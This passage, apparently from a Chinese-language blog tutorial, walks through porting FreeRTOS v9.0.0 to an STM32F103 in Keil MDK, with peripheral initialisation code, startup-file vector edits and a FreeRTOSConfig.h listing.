    │  │      portASM.S
    │  │      portmacro.h
    │  │
    │  ├─ARM_CM0
    │  │      port.c
    │  │      portmacro.h
    │  │
    │  ├─ARM_CM3
    │  │      port.c
    │  │      portmacro.h
    │  │
    │  ├─ARM_CM3_MPU
    │  │      port.c
    │  │      portmacro.h
    │  │
    │  ├─ARM_CM4F
    │  │      port.c
    │  │      portmacro.h
    │  │
    │  ├─ARM_CM4_MPU
    │  │      port.c
    │  │      portmacro.h
    │  │
    │  ├─ARM_CM7
    │  │  │  ReadMe.txt
    │  │  │
    │  │  └─r0p1
    │  │          port.c
    │  │          portmacro.h
    │  │
    │  ├─ARM_CR5
    │  │      port.c
    │  │      portASM.S
    │  │      portmacro.h
    │  │
    │  ├─ARM_CRx_No_GIC
    │  │      port.c
    │  │      portASM.S
    │  │      portmacro.h
    │  │
    │  ├─ATMega323
    │  │      port.c
    │  │      portmacro.h
    │  │
    │  ├─AVR32_UC3
    │  │      exception.S
    │  │      port.c
    │  │      portmacro.h
    │  │
    │  ├─ColdFire_V2
    │  │      port.c
    │  │      portasm.S
    │  │      portmacro.h
    │  │
    │  ├─CORTUS_APS3
    │  │      port.c
    │  │      portmacro.h
    │  │
    │  ├─H8S2329
    │  │      port.c
    │  │      portmacro.h
    │  │
    │  ├─HCS12
    │  │      port.c
    │  │      portmacro.h
    │  │
    │  ├─IA32_flat
    │  │      ISR_Support.h
    │  │      port.c
    │  │      portASM.S
    │  │      portmacro.h
    │  │
    │  ├─MCF5235
    │  │      port.c
    │  │      portmacro.h
    │  │
    │  ├─MicroBlaze
    │  │      port.c
    │  │      portasm.s
    │  │      portmacro.h
    │  │
    │  ├─MicroBlazeV8
    │  │      port.c
    │  │      portasm.S
    │  │      portmacro.h
    │  │      port_exceptions.c
    │  │
    │  ├─MicroBlazeV9
    │  │      port.c
    │  │      portasm.S
    │  │      portmacro.h
    │  │      port_exceptions.c
    │  │
    │  ├─MSP430F449
    │  │      port.c
    │  │      portmacro.h
    │  │
    │  ├─NiosII
    │  │      port.c
    │  │      portmacro.h
    │  │      port_asm.S
    │  │
    │  ├─PPC405_Xilinx
    │  │      FPU_Macros.h
    │  │      port.c
    │  │      portasm.S
    │  │      portmacro.h
    │  │
    │  ├─PPC440_Xilinx
    │  │      FPU_Macros.h
    │  │      port.c
    │  │      portasm.S
    │  │      portmacro.h
    │  │
    │  ├─RL78
    │  │      isr_support.h
    │  │      port.c
    │  │      portasm.S
    │  │      portmacro.h
    │  │
    │  ├─RX100
    │  │      port.c
    │  │      portmacro.h
    │  │
    │  ├─RX600
    │  │      port.c
    │  │      portmacro.h
    │  │
    │  ├─RX600v2
    │  │      port.c
    │  │      portmacro.h
    │  │
    │  ├─STR75x
    │  │      port.c
    │  │      portISR.c
    │  │      portmacro.h
    │  │
    │  └─TriCore_1782
    │          port.c
    │          portmacro.h
    │          porttrap.c
    │
    ├─IAR
    │  ├─78K0R
    │  │      ISR_Support.h
    │  │      port.c
    │  │      portasm.s26
    │  │      portmacro.h
    │  │
    │  ├─ARM_CA5_No_GIC
    │  │      port.c
    │  │      portASM.h
    │  │      portASM.s
    │  │      portmacro.h
    │  │
    │  ├─ARM_CA9
    │  │      port.c
    │  │      portASM.h
    │  │      portASM.s
    │  │      portmacro.h
    │  │
    │  ├─ARM_CM0
    │  │      port.c
    │  │      portasm.s
    │  │      portmacro.h
    │  │
    │  ├─ARM_CM3
    │  │      port.c
    │  │      portasm.s
    │  │      portmacro.h
    │  │
    │  ├─ARM_CM4F
    │  │      port.c
    │  │      portasm.s
    │  │      portmacro.h
    │  │
    │  ├─ARM_CM7
    │  │  │  ReadMe.txt
    │  │  │
    │  │  └─r0p1
    │  │          port.c
    │  │          portasm.s
    │  │          portmacro.h
    │  │
    │  ├─ARM_CRx_No_GIC
    │  │      port.c
    │  │      portASM.s
    │  │      portmacro.h
    │  │
    │  ├─ATMega323
    │  │      port.c
    │  │      portmacro.h
    │  │      portmacro.s90
    │  │
    │  ├─AtmelSAM7S64
    │  │      AT91SAM7S64.h
    │  │      AT91SAM7S64_inc.h
    │  │      AT91SAM7X128.h
    │  │      AT91SAM7X128_inc.h
    │  │      AT91SAM7X256.h
    │  │      AT91SAM7X256_inc.h
    │  │      ISR_Support.h
    │  │      lib_AT91SAM7S64.h
    │  │      lib_AT91SAM7X128.h
    │  │      lib_AT91SAM7X256.h
    │  │      port.c
    │  │      portasm.s79
    │  │      portmacro.h
    │  │
    │  ├─AtmelSAM9XE
    │  │      ISR_Support.h
    │  │      port.c
    │  │      portasm.s79
    │  │      portmacro.h
    │  │
    │  ├─AVR32_UC3
    │  │      exception.s82
    │  │      port.c
    │  │      portmacro.h
    │  │      read.c
    │  │      write.c
    │  │
    │  ├─LPC2000
    │  │      ISR_Support.h
    │  │      port.c
    │  │      portasm.s79
    │  │      portmacro.h
    │  │
    │  ├─MSP430
    │  │      port.c
    │  │      portasm.h
    │  │      portext.s43
    │  │      portmacro.h
    │  │
    │  ├─MSP430X
    │  │      data_model.h
    │  │      port.c
    │  │      portext.s43
    │  │      portmacro.h
    │  │
    │  ├─RL78
    │  │      ISR_Support.h
    │  │      port.c
    │  │      portasm.s87
    │  │      portmacro.h
    │  │
    │  ├─RX100
    │  │      port.c
    │  │      portmacro.h
    │  │      port_asm.s
    │  │
    │  ├─RX600
    │  │      port.c
    │  │      portmacro.h
    │  │      port_asm.s
    │  │
    │  ├─RXv2
    │  │      port.c
    │  │      portmacro.h
    │  │      port_asm.s
    │  │
    │  ├─STR71x
    │  │      ISR_Support.h
    │  │      port.c
    │  │      portasm.s79
    │  │      portmacro.h
    │  │
    │  ├─STR75x
    │  │      ISR_Support.h
    │  │      port.c
    │  │      portasm.s79
    │  │      portmacro.h
    │  │
    │  ├─STR91x
    │  │      ISR_Support.h
    │  │      port.c
    │  │      portasm.s79
    │  │      portmacro.h
    │  │
    │  └─V850ES
    │          ISR_Support.h
    │          port.c
    │          portasm.s85
    │          portasm_Fx3.s85
    │          portasm_Hx2.s85
    │          portmacro.h
    │
    ├─Keil
    │      See-also-the-RVDS-directory.txt
    │
    ├─MemMang
    │      heap_1.c
    │      heap_2.c
    │      heap_3.c
    │      heap_4.c
    │      heap_5.c
    │      ReadMe.url
    │
    ├─MikroC
    │  └─ARM_CM4F
    │          port.c
    │          portmacro.h
    │
    ├─MPLAB
    │  ├─PIC18F
    │  │      port.c
    │  │      portmacro.h
    │  │      stdio.h
    │  │
    │  ├─PIC24_dsPIC
    │  │      port.c
    │  │      portasm_dsPIC.S
    │  │      portasm_PIC24.S
    │  │      portmacro.h
    │  │
    │  ├─PIC32MEC14xx
    │  │      ISR_Support.h
    │  │      port.c
    │  │      portmacro.h
    │  │      port_asm.S
    │  │
    │  ├─PIC32MX
    │  │      ISR_Support.h
    │  │      port.c
    │  │      portmacro.h
    │  │      port_asm.S
    │  │
    │  └─PIC32MZ
    │          ISR_Support.h
    │          port.c
    │          portmacro.h
    │          port_asm.S
    │
    ├─MSVC-MingW
    │      port.c
    │      portmacro.h
    │
    ├─oWatcom
    │  └─16BitDOS
    │      ├─common
    │      │      portasm.h
    │      │      portcomn.c
    │      │
    │      ├─Flsh186
    │      │      port.c
    │      │      portmacro.h
    │      │
    │      └─PC
    │              port.c
    │              portmacro.h
    │
    ├─Paradigm
    │  └─Tern_EE
    │      ├─large_untested
    │      │      port.c
    │      │      portasm.h
    │      │      portmacro.h
    │      │
    │      └─small
    │              port.c
    │              portasm.h
    │              portmacro.h
    │
    ├─Renesas
    │  ├─RX100
    │  │      port.c
    │  │      portmacro.h
    │  │      port_asm.src
    │  │
    │  ├─RX200
    │  │      port.c
    │  │      portmacro.h
    │  │      port_asm.src
    │  │
    │  ├─RX600
    │  │      port.c
    │  │      portmacro.h
    │  │      port_asm.src
    │  │
    │  ├─RX600v2
    │  │      port.c
    │  │      portmacro.h
    │  │      port_asm.src
    │  │
    │  └─SH2A_FPU
    │          ISR_Support.inc
    │          port.c
    │          portasm.src
    │          portmacro.h
    │
    ├─Rowley
    │  ├─ARM7
    │  │      readme.txt
    │  │
    │  └─MSP430F449
    │          port.c
    │          portasm.h
    │          portext.asm
    │          portmacro.h
    │
    ├─RVDS
    │  ├─ARM7_LPC21xx
    │  │      port.c
    │  │      portASM.s
    │  │      portmacro.h
    │  │      portmacro.inc
    │  │
    │  ├─ARM_CA9
    │  │      port.c
    │  │      portASM.s
    │  │      portmacro.h
    │  │      portmacro.inc
    │  │
    │  ├─ARM_CM0
    │  │      port.c
    │  │      portmacro.h
    │  │
    │  ├─ARM_CM3
    │  │      port.c
    │  │      portmacro.h
    │  │
    │  ├─ARM_CM4F
    │  │      port.c
    │  │      portmacro.h
    │  │
    │  ├─ARM_CM4_MPU
    │  │      port.c
    │  │      portmacro.h
    │  │
    │  └─ARM_CM7
    │      │  ReadMe.txt
    │      │
    │      └─r0p1
    │              port.c
    │              portmacro.h
    │
    ├─SDCC
    │  └─Cygnal
    │          port.c
    │          portmacro.h
    │
    ├─Softune
    │  ├─MB91460
    │  │      port.c
    │  │      portmacro.h
    │  │      __STD_LIB_sbrk.c
    │  │
    │  └─MB96340
    │          port.c
    │          portmacro.h
    │          __STD_LIB_sbrk.c
    │
    ├─Tasking
    │  └─ARM_CM4F
    │          port.c
    │          portmacro.h
    │          port_asm.asm
    │
    └─WizC
        └─PIC18
            │  addFreeRTOS.h
            │  Install.bat
            │  port.c
            │  portmacro.h
            │
            └─Drivers
                └─Tick
                        isrTick.c
                        Tick.c

</code></pre>
<h2 id="系统移植"><a href="#系统移植" class="headerlink" title="系统移植"></a>系统移植</h2><p>以 stm32f103RCT6 为例，选择 Keil MDK v5.21.1.0 作为开发平台进行系统移植。</p>
<h3 id="功能描述"><a href="#功能描述" class="headerlink" title="功能描述"></a>功能描述</h3><ol>
<li>PB10 作为输出口，控制 LED 的亮灭；</li>
<li>编写延时函数 delay ，以毫秒为单位；</li>
<li>使用 USART2 循环发送数据，波特率9600，8位数据位，1位停止位，无校验，无硬件控制流；</li>
<li>系统移植，添加 3 个 task：vLEDOnTask，vLEDOffTask，vUasrtSendTask</li>
</ol>
<h3 id="创建项目-BrightLed"><a href="#创建项目-BrightLed" class="headerlink" title="创建项目 (BrightLed)"></a>创建项目 (BrightLed)</h3><ul>
<li>选择芯片 (stm32f103RCT6)</li>
</ul>
<p><img src="/assets/stm32/selectChip.png" alt="选择芯片"></p>
<ul>
<li>选择外设</li>
</ul>
<p>自从 Keil MDK 更新至 v5.0 以后，软件安装完成便可使用 &quot;Pack installer&quot; 让其自动下载所需的软件包；新建项目也变得更加简单方便，可以使用 &quot;manager run-time environment&quot; 选择所需的片内外设。</p>
<pre><code class="txt">Software Compoent
├─CMSIS
│    │  CORE
│    │
└─Device
     │  GPIO
     │  Startup
     │
     └─stdPeriph Drivers
         │  Framework
         │  GPIO
         │  RCC
         │  USARTs
</code></pre>
<p>外设说明：</p>
<ol>
<li><strong>CORE</strong>(必选)： 提供与 Cortex-M0、<strong>Cortex-M3</strong>、Cortex-M4、SC000 和 SC300 处理器与外围寄存器之间的接口</li>
<li><strong>Framework</strong>(必选)： 标准外设驱动框架(Standard Peripheral Drivers Framework)</li>
<li><strong>RCC</strong>(必选)： 提供与系统时钟相关的库函数</li>
<li><strong>GPIO</strong>： 提供与通用IO接口相关的库函数</li>
<li><strong>USART</strong>： 提供与UART/USART相关的库函数</li>
</ol>
<p><img src="/assets/stm32/selectDevice.png" alt="选择外设"></p>
<ul>
<li>设置参数</li>
</ul>
<p>打开 <code>Options for target</code>，依次设置下列参数：</p>
<ol>
<li>Target &gt; Xtal(MHz)): 8.0</li>
<li>C/C++  &gt; Define: USE_STDPERIPH_DRIVER,STM32F10X_MD</li>
<li>Debug  &gt; Use: ST-Link Debugger<br> 3.1 Settings &gt; Debug &gt; Debug Adapter: ST-LINK/V2; Port:SW; Max: 1.8MHz<br> 3.2 Settings &gt; Flash Download &gt; Reset and Run:[√]<br> 3.3 Settings &gt; Flash Download &gt; Programming Algorithm: STM32f10x Med-density Flash</li>
</ol>
<p>所有参数均设置完成后，项目创建过程就结束了。</p>
<p><img src="/assets/stm32/setSymbols.png" alt="设置Processing Symbols"></p>
<p><img src="/assets/stm32/selectFlash.png" alt="选择flash大小"></p>
<h3 id="初始化"><a href="#初始化" class="headerlink" title="初始化"></a>初始化</h3><p>创建项目后，需要编写代码以实现对系统时钟及所需外设的初始化。</p>
<ul>
<li>初始化流程</li>
</ul>
<ol>
<li>首先，将默认组名称改为 <code>USER</code> ，并在本地项目目录下添加文件夹，命名为 &quot;USER&quot; 。</li>
<li>其次，新建并保存以下文件至 &quot;USER&quot; 文件夹，同时添加其中的 .c 文件到项目组 <code>USER</code>中。<br> 2.1 主程序：main.c / main.h<br> 2.2 中断程序：stm32f10x_it.c / stm32f10x_it.h<br> 2.3 延时模块: delay.c / delay.h<br> 2.4 led控制模块：led.c / led.h<br> 2.5 串口通信模块：usart.c / usart.h</li>
<li>最后，对各个文件进行编码，完成各项初始化任务</li>
</ol>
<ul>
<li>项目文件结构</li>
</ul>
<p><img src="/assets/stm32/projectFile.png" alt="项目目录"></p>
<ul>
<li>初始化程序设计</li>
</ul>
<blockquote>
<p><strong>delay.c / delay.h</strong></p>
</blockquote>
<p>delay.c</p>
<pre><code class="C">#include &quot;delay.h&quot;

volatile u32 TimingDelay;

void delayInit(void)
{
  /* SystemFrequency / 1000    1ms
   * SystemFrequency / 100000   10us
   * SystemFrequency / 1000000 1us
   */
  #define SYSCLK_FREQ_72MHz  72000000    // 系统主频
  if (SysTick_Config(SYSCLK_FREQ_72MHz / 1000000))
  {
  /* Capture error */
    while (1);
  }
  SysTick-&gt;CTRL &amp;= ~SysTick_CTRL_ENABLE_Msk;
}

// ms级延时函数
void delay(__IO u32 nTime)
{
  TimingDelay = nTime * 1000;
  SysTick-&gt;CTRL |= SysTick_CTRL_ENABLE_Msk;
  while(TimingDelay != 0);
}

// us级延时函数
void delayMicroseconds(__IO u32 nTime)
{
  TimingDelay = nTime;
  SysTick-&gt;CTRL |= SysTick_CTRL_ENABLE_Msk;
  while(TimingDelay != 0);
}

</code></pre>
<p>delay.h</p>
<pre><code class="C">#ifndef DELAY_H_
#define DELAY_H_

#include &quot;stm32f10x.h&quot;

void delayInit(void);
void delay(__IO u32 nTime);
void delayMicroseconds(__IO u32 nTime);

#endif /* DELAY_H_ */
</code></pre>
<blockquote>
<p><strong>led.c / led.h</strong></p>
</blockquote>
<p>led.c</p>
<pre><code class="C">#include &quot;led.h&quot;

void ledGPIOConfiguration(void)
{
  GPIO_InitTypeDef  GPIO_InitStructure;

  GPIO_InitStructure.GPIO_Pin = GPIO_Pin_10;
  GPIO_InitStructure.GPIO_Speed = GPIO_Speed_50MHz;
  GPIO_InitStructure.GPIO_Mode = GPIO_Mode_Out_PP;
  GPIO_Init(GPIOB, &amp;GPIO_InitStructure);
}
</code></pre>
<p>led.h</p>
<pre><code class="C">#ifndef LED_H
#define LED_H

#include &quot;stm32f10x.h&quot;

#define LED_PORT (GPIO_Pin_10)

void ledGPIOConfiguration(void);

#endif /* LED_H */
</code></pre>
<blockquote>
<p><strong>usart.c / usart.h</strong></p>
</blockquote>
<p>usart.c</p>
<pre><code class="C">#include &quot;usart.h&quot;

//串口驱动应用标志

static bool Derive_UART2SendFlag, Derive_UART2TxIntState;

//开串口 并执行初始化
//8位数据位 无校验 1位起始位/1位停止位 允许收发中断  宏定义BAUDRATE设定波特率 低优先级中断
void usart2Config(void)
{
  //波特率设置
  #define   UART_BAUDDEF  9600
  GPIO_InitTypeDef    GPIO_InitStructure;
  USART_InitTypeDef   USART_InitStructure;
  NVIC_InitTypeDef NVIC_InitStructure;
  RCC_APB1PeriphClockCmd(RCC_APB1Periph_USART2, ENABLE);
  //管脚配置
  GPIO_InitStructure.GPIO_Pin = GPIO_Pin_2;
  GPIO_InitStructure.GPIO_Mode = GPIO_Mode_AF_PP;
  GPIO_InitStructure.GPIO_Speed = GPIO_Speed_50MHz;
  GPIO_Init(GPIOA, &amp;GPIO_InitStructure);      /* TXIO */
  GPIO_InitStructure.GPIO_Pin = GPIO_Pin_3;
  GPIO_InitStructure.GPIO_Mode = GPIO_Mode_IN_FLOATING;
  GPIO_Init(GPIOA, &amp;GPIO_InitStructure);       /* RXIO */
  //串口工作模式配置
  USART_InitStructure.USART_BaudRate = UART_BAUDDEF;
  USART_InitStructure.USART_WordLength = USART_WordLength_8b;
  USART_InitStructure.USART_StopBits = USART_StopBits_1;
  USART_InitStructure.USART_Parity = USART_Parity_No ;
  USART_InitStructure.USART_HardwareFlowControl = USART_HardwareFlowControl_None;
  USART_InitStructure.USART_Mode = USART_Mode_Rx | USART_Mode_Tx;
  USART_Init(USART2, &amp;USART_InitStructure);
  //中断设置
  NVIC_InitStructure.NVIC_IRQChannel = USART2_IRQn;
  NVIC_InitStructure.NVIC_IRQChannelPreemptionPriority = 1;       //低优先级别的中断
  NVIC_InitStructure.NVIC_IRQChannelSubPriority = 0;        //响应中断等级为0
  NVIC_InitStructure.NVIC_IRQChannelCmd = ENABLE;
  NVIC_Init(&amp;NVIC_InitStructure);
  Derive_UART2TxIntState = false;
  USART_ITConfig(USART2, USART_IT_RXNE, ENABLE);
  //START
  USART_Cmd(USART2, ENABLE);
}

//从串口发送一个字节
void UARTSendByByter(u16 Data)
{
  //发送数据
  USART_SendData(USART2, (u8)Data);

  if(!Derive_UART2TxIntState)
  {
    Derive_UART2TxIntState = true;
    USART_ITConfig(USART2, USART_IT_TXE, ENABLE);
  }
  Derive_UART2SendFlag = true;
}

//串口收发中断处理函数
void UART_TRxOver_Interrupt(void)
{
  if(USART_GetITStatus(USART2, USART_IT_TXE) == SET)
  {
    //发送中断
    //清零标志
    USART_ClearITPendingBit(USART2, USART_IT_TXE);
    Derive_UART2SendFlag = false;
    //tx interrupt..
    //...
    if(!Derive_UART2SendFlag)
    {
        USART_ITConfig(USART2, USART_IT_TXE, DISABLE);
        Derive_UART2TxIntState = false;
    }
  }
  if(USART_GetITStatus(USART2, USART_IT_RXNE) == SET)
  {
    //接收中断
    //-------- 回传接收到的数据 --------
    UARTSendByByter(USART_ReceiveData(USART2));
    USART_ClearFlag(USART2,USART_FLAG_RXNE);
  }
}

</code></pre>
<p>usart.h</p>
<pre><code class="C">#ifndef USART_H
#define USART_H

#include &quot;stm32f10x.h&quot;
#include &quot;stm32f10x_rcc.h&quot;
#include &quot;stm32f10x_gpio.h&quot;
#include &quot;stm32f10x_usart.h&quot;

#define false 0
#define true 1
typedef unsigned char bool;

void usart2Config(void);
void UARTSendByByter(u16 Data);

#endif  /* USART_H */
</code></pre>
<blockquote>
<p><strong>stm32f10x_it.c / stm32f10x_it.h</strong></p>
</blockquote>
<p>stm32f10x_it.c</p>
<pre><code class="C">#include &quot;stm32f10x_it.h&quot;
void NMI_Handler(void)
{
}

void HardFault_Handler(void)
{
  /* Go to infinite loop when Hard Fault exception occurs */
  while (1)
  {
  }
}

void MemManage_Handler(void)
{
  /* Go to infinite loop when Memory Manage exception occurs */
  while (1)
  {
  }
}

void BusFault_Handler(void)
{
  /* Go to infinite loop when Bus Fault exception occurs */
  while (1)
  {
  }
}

void UsageFault_Handler(void)
{
  /* Go to infinite loop when Usage Fault exception occurs */
  while (1)
  {
  }
}

#ifndef RTE_RTOS_RTX
void SVC_Handler(void)
{
}
#endif

void DebugMon_Handler(void)
{
}

#ifndef RTE_RTOS_RTX
void PendSV_Handler(void)
{
}
#endif

extern volatile u32 TimingDelay;
void SysTick_Handler(void) {
  if (TimingDelay != 0x00) {
    TimingDelay--;
  }
}

extern void UART_TRxOver_Interrupt(void);
void USART2_IRQHandler(void)
{
  UART_TRxOver_Interrupt();
}
</code></pre>
<p>stm32f10x_it.h</p>
<pre><code class="C">#ifndef __STM32F10x_IT_H
#define __STM32F10x_IT_H

#ifdef __cplusplus
 extern &quot;C&quot; {
#endif

/* Includes ------------------------------------------------------------------*/
#include &quot;stm32f10x.h&quot;
/* Exported types ------------------------------------------------------------*/
/* Exported constants --------------------------------------------------------*/
/* Exported macro ------------------------------------------------------------*/
/* Exported functions --------------------------------------------------------*/

void NMI_Handler(void);
void HardFault_Handler(void);
void MemManage_Handler(void);
void BusFault_Handler(void);
void UsageFault_Handler(void);
void SVC_Handler(void);
void DebugMon_Handler(void);
void PendSV_Handler(void);
void SysTick_Handler(void);
void USART2_IRQHandler(void);

#ifdef __cplusplus
}
#endif

#endif /* __STM32F10x_IT_H */
</code></pre>
<blockquote>
<p><strong>main.c / main.h</strong></p>
</blockquote>
<p>main.c</p>
<pre><code class="C">/*******************************************************************************
 * Header       : Learning FreeRTOS
 * File Name    : main.c
 * Author       : wgt
 * Date         : 2016.11.2
 * Description  :
 *******************************************************************************/
#include &quot;main.h&quot;

/* ENABLE the clk of GPIO */
static void deviceInit(void);

/* setup the hardware of system */
static void prvSetupHardware(void);

/*******************************************************************************
* Function Name  : main
* Description    : main function,the interface of system
* Input          : None
* Return         : None
*******************************************************************************/
int main(void)
{
  prvSetupHardware();  // 设备初始化

  while(1)
  {
  }
}

/*******************************************************************************
* Function Name  : prvSetupHardware
* Description    : initial hardwares
* Input          : None
* Return         : None
*******************************************************************************/
static void prvSetupHardware(void)
{
  deviceInit();
  delayInit();    // SysTick滴答时钟初始化
  ledGPIOConfiguration();
  usart2Config();
}


/*******************************************************************************
* Function Name  : deviceInit
* Description    : ENABLE the clk of GPIO
* Input          : None
* Return         : None
*******************************************************************************/
static void deviceInit(void)
{
  //--------------------------- CLK INIT, HSE PLL ----------------------------
  ErrorStatus HSEStartUpStatus;
  //RCC reset
  RCC_DeInit();
  //开启外部时钟 并执行初始化
  RCC_HSEConfig(RCC_HSE_ON);
  //等待外部时钟准备好
  HSEStartUpStatus = RCC_WaitForHSEStartUp();
  //启动失败 在这里等待
  while(HSEStartUpStatus == ERROR);
  //设置内部总线时钟
  RCC_HCLKConfig(RCC_SYSCLK_Div1);
  RCC_PCLK1Config(RCC_HCLK_Div1);
  RCC_PCLK2Config(RCC_HCLK_Div1);
  //外部时钟为8M 这里倍频到72M
  RCC_PLLConfig(RCC_PLLSource_HSE_Div1, RCC_PLLMul_9);
  RCC_PLLCmd(ENABLE);
  while(RCC_GetFlagStatus(RCC_FLAG_PLLRDY) == RESET);
  RCC_SYSCLKConfig(RCC_SYSCLKSource_PLLCLK);
  while(RCC_GetSYSCLKSource() != 0x08);

  //----------------------------- CLOSE HSI ---------------------------
  //关闭内部时钟HSI
  RCC_HSICmd(DISABLE);

  //中断配置 2-level interrupt
  NVIC_PriorityGroupConfig(NVIC_PriorityGroup_2);

  //开总中断
  __enable_irq();
  /******************   OPEN GPIO CLK   **************/
  RCC_APB2PeriphClockCmd(RCC_APB2Periph_GPIOA, ENABLE);
  RCC_APB2PeriphClockCmd(RCC_APB2Periph_GPIOB, ENABLE);
  RCC_APB2PeriphClockCmd(RCC_APB2Periph_GPIOC, ENABLE);
  RCC_APB2PeriphClockCmd(RCC_APB2Periph_AFIO, ENABLE);
}
</code></pre>
<p>main.h</p>
<pre><code class="C">#ifndef MAIN_H
#define MAIN_H

#include &quot;stm32f10x.h&quot;
#include &quot;delay.h&quot;
#include &quot;usart.h&quot;
#include &quot;led.h&quot;

#endif  /* MAIN_H */
</code></pre>
<p>至此，系统时钟及外设的初始化程序已经完成。以上程序，除去 led.c/led.h, usart.c/usart.h 外，可作为无需操作系统的stm32项目模板。</p>
<h3 id="内核移植"><a href="#内核移植" class="headerlink" title="内核移植"></a>内核移植</h3><ul>
<li>新建组<ul>
<li>在项目中添加一个组，命名为 <strong>FreeRTOS</strong> ；</li>
<li>在本地目录新建文件夹，同样命名为 FreeRTOS ，用于存放系统内核的源文件；</li>
<li>在 FreeRTOS 文件夹下新建子文件夹 include ，用于存放系统内核的头文件。</li>
</ul>
</li>
<li>复制文件<ul>
<li>从系统 FreeRTOSv9.0.0 的源码 <code>FreeRTOS\Source</code> 中找到以下源文件，并将其复制至 FreeRTOS 文件夹；<ul>
<li><code>Source</code> 中的 <strong>list.c</strong>, <strong>queue.c</strong>, <strong>tasks.c</strong></li>
<li><code>Source\portable\RVDS\ARM_CM3</code> 中的 <strong>port.c</strong></li>
<li><code>Source\portable\MemMang</code> 中的 <strong>heap_2.c</strong></li>
</ul>
</li>
<li>从系统 FreeRTOSv9.0.0 的源码 <code>FreeRTOS</code> 中找到以下头文件，并将其复制至 FreeRTOS/include 文件夹；<ul>
<li><code>Source\include</code> 中的所有头文件，包括其中的 stdint.readme 文件</li>
<li><code>Source\portable\RVDS\ARM_CM3</code> 中的 <strong>portmacro.h</strong></li>
<li><code>Demo\CORTEX_STM32F103_Keil</code> 中的 <strong>FreeRTOSConfig.h</strong></li>
</ul>
</li>
<li>在项目组 FreeRTOS 中添加以上已复制好的源文件</li>
</ul>
</li>
</ul>
<blockquote>
<p><strong>说明</strong>：FreeRTOS可以在很多不同编译器中编译，其中的一些编译器比同类有更高级特性。因为这个原因，FreeRTOS不使用任何非C语言标准的特性或语法。一个例外情况是头文件stdint.h。在文件夹FreeRTOS/Source/include下包含一个叫做stdint.readme的文件，如果你的编译器不提供stdint类型定义，可以将stdint.readme文件重命名为stdint.h。</p>
</blockquote>
<p>参考：<a href="http://blog.csdn.net/zhzht19861011/article/details/50057531" target="_blank" rel="noopener">FreeRTOS编码标准及风格指南</a></p>
<p>完成以上步骤后，文件结构应该如下各图所示：<br>File - FreeRTOS</p>
<p><img src="/assets/stm32/folderfreeRTOS.png" alt="本地文件中的FreeRTOS文件夹"></p>
<p>File - FreeRTOS\include</p>
<p><img src="/assets/stm32/folderfreeRTOSInclude.png" alt="本地文件中的include文件夹"></p>
<p>MDK - FreeRTOS</p>
<p><img src="/assets/stm32/groupfreeRTOS.png" alt="MDK中的FreeRTOS组"></p>
<ul>
<li>添加路径</li>
</ul>
<p>再次打开 <code>Options for target</code>&gt;&gt;<code>C/C++</code>，在 Include Paths 中添加:</p>
<ol>
<li>.\USER</li>
<li>.\FreeRTOS</li>
<li>.\FreeRTOS\include</li>
</ol>
<p><img src="/assets/stm32/addPath.png" alt="添加路径"></p>
<ul>
<li>修改启动文件</li>
</ul>
<p>打开文件 &quot;startup_stm32f10x_md.s&quot;，在 50 行附近找到以下代码段：</p>
<p>文件修改前</p>
<p><img src="/assets/stm32/beforeAddExport.png" alt="添加Export之前的启动文件"></p>
<p>修改方式如下：</p>
<p>在 &quot;__heap_limit&quot;后添加：</p>
<pre><code class="yml">IMPORT xPortPendSVHandler
IMPORT xPortSysTickHandler
IMPORT vPortSVCHandler
</code></pre>
<p>将 75 行左右的</p>
<pre><code class="yml">DCD     SVC_Handler
DCD     PendSV_Handler
DCD     SysTick_Handler
</code></pre>
<p>依次修改为：</p>
<pre><code class="yml">DCD     vPortSVCHandler
DCD     xPortPendSVHandler
DCD     xPortSysTickHandler
</code></pre>
<p>文件修改后</p>
<p><img src="/assets/stm32/afterAddExport.png" alt="添加Export之前的启动文件"></p>
<h3 id="内核裁剪文件"><a href="#内核裁剪文件" class="headerlink" title="内核裁剪文件"></a>内核裁剪文件</h3><p>前面添加的头文件 &quot;FreeRTOSConfig.h&quot; 是系统内核配置文件，通过修改文件中的宏定义，可以对内核进行裁剪，保留所需功能。从例程中得到的该文件源码如下，更加详细的设置方法和各变量用途将在后续应用中介绍。</p>
<pre><code class="C">#ifndef FREERTOS_CONFIG_H
#define FREERTOS_CONFIG_H

/*-----------------------------------------------------------
 * Application specific definitions.
 *
 * These definitions should be adjusted for your particular hardware and
 * application requirements.
 *
 * THESE PARAMETERS ARE DESCRIBED WITHIN THE &#39;CONFIGURATION&#39; SECTION OF THE
 * FreeRTOS API DOCUMENTATION AVAILABLE ON THE FreeRTOS.org WEB SITE.
 *
 * See http://www.freertos.org/a00110.html.
 *----------------------------------------------------------*/

#define configUSE_PREEMPTION    1
#define configUSE_IDLE_HOOK      0
#define configUSE_TICK_HOOK      0
#define configCPU_CLOCK_HZ      ( ( unsigned long ) 72000000 )
#define configTICK_RATE_HZ      ( ( TickType_t ) 1000 )
#define configMAX_PRIORITIES    ( 5 )
#define configMINIMAL_STACK_SIZE  ( ( unsigned short ) 128 )
#define configTOTAL_HEAP_SIZE    ( ( size_t ) ( 17 * 1024 ) )
#define configMAX_TASK_NAME_LEN    ( 16 )
#define configUSE_TRACE_FACILITY  0
#define configUSE_16_BIT_TICKS    0
#define configIDLE_SHOULD_YIELD    1

/* Co-routine definitions. */
#define configUSE_CO_ROUTINES     0
#define configMAX_CO_ROUTINE_PRIORITIES ( 2 )

/* Set the following definitions to 1 to include the API function, or zero
to exclude the API function. */

#define INCLUDE_vTaskPrioritySet    1
#define INCLUDE_uxTaskPriorityGet    1
#define INCLUDE_vTaskDelete        1
#define INCLUDE_vTaskCleanUpResources  0
#define INCLUDE_vTaskSuspend      1
#define INCLUDE_vTaskDelayUntil      1
#define INCLUDE_vTaskDelay        1

/* This is the raw value as per the Cortex-M3 NVIC.  Values can be 255
(lowest) to 0 (1?) (highest). */
#define configKERNEL_INTERRUPT_PRIORITY     255
/* !!!! configMAX_SYSCALL_INTERRUPT_PRIORITY must not be set to zero !!!!
See http://www.FreeRTOS.org/RTOS-Cortex-M3-M4.html. */
#define configMAX_SYSCALL_INTERRUPT_PRIORITY   191 /* equivalent to 0xb0, or priority 11. */


/* This is the value being used as per the ST library which permits 16
priority values, 0 to 15.  This must correspond to the
configKERNEL_INTERRUPT_PRIORITY setting.  Here 15 corresponds to the lowest
NVIC value of 255. */
#define configLIBRARY_KERNEL_INTERRUPT_PRIORITY  15

#endif /* FREERTOS_CONFIG_H */
</code></pre>
